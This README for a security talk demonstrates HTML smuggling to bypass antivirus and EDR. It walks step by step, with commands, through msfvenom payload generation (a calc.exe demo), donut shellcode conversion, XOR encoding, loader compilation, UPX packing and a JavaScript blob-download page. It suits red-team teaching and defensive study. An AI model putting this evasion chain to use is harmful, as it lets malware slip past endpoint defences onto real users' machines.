
# html-smuggling-edr-bypass

## 🧠 Description

This project demonstrates how to use **HTML Smuggling** as an evasion technique to bypass **Antivirus (AV)** and **Endpoint Detection and Response (EDR)** solutions. Originally presented at *Leiria Tech Talks*, this walkthrough covers payload generation, shellcode transformation, in-memory execution, and delivery via a web browser using HTML Smuggling techniques.

## 📑 Table of Contents

- [Description](#-description)
- [Table of Contents](#-table-of-contents)
- [Prerequisites](#-prerequisites)
- [Step-by-Step Guide](#-step-by-step-guide)
- [References](#-references)
- [Credits](#-credits)

## 🔧 Prerequisites

- Linux-based environment
- `msfvenom`
- [`donut`](https://github.com/TheWover/donut)
- `python3`
- `mingw-w64`
- `UPX`
- Modern web browser (Chrome, Edge)

## 🚀 Step-by-Step Guide

### 1. Generate EXE Payload

```bash
msfvenom -p windows/exec CMD=calc.exe -f exe -o calc_payload.exe
```

### 2. Convert EXE to Shellcode using Donut

```bash
donut -i calc_payload.exe -f 1 -o donut_payload.bin -z 1 -e 3 -b 3
```

### 3. XOR Encode the Shellcode

Run the Python script:

```bash
python3 xor_donut.py
```

### 4. Convert Shellcode to C Header

```bash
xxd -i shellcode_xored.bin > shellcode.h
```

### 5. Build the Loader in C

Compile with `mingw` for 32-bit systems:

```bash
i686-w64-mingw32-gcc loader.c -o loader.exe -m32 -Os -s -fno-ident -Wno-write-strings
```

### 6. Compress the Loader with UPX

```bash
upx --ultra-brute loader.exe
```

### 7. Prepare for HTML Smuggling

Encode the binary to Base64:

```bash
base64 -w 0 loader.exe > loader
```

### 8. Build the HTML Smuggling Page

Create an `.html` file to reconstruct and trigger the download of the binary:

```html
<script>
let b64 = "YOUR_BASE64_HERE";
let blob = new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))]);
let a = document.createElement("a");
a.href = URL.createObjectURL(blob);
a.download = "loader.exe";
a.click();
</script>
```

## 📚 References

- [Microsoft Security Blog – HTML Smuggling](https://www.microsoft.com/en-us/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/)
- [Donut Shellcode Generator](https://github.com/TheWover/donut)

## 👨‍💻 Credits

Presented by: **Milton Silva**  
Security Researcher
[LinkedIn](https://www.linkedin.com/in/milton-araujo)
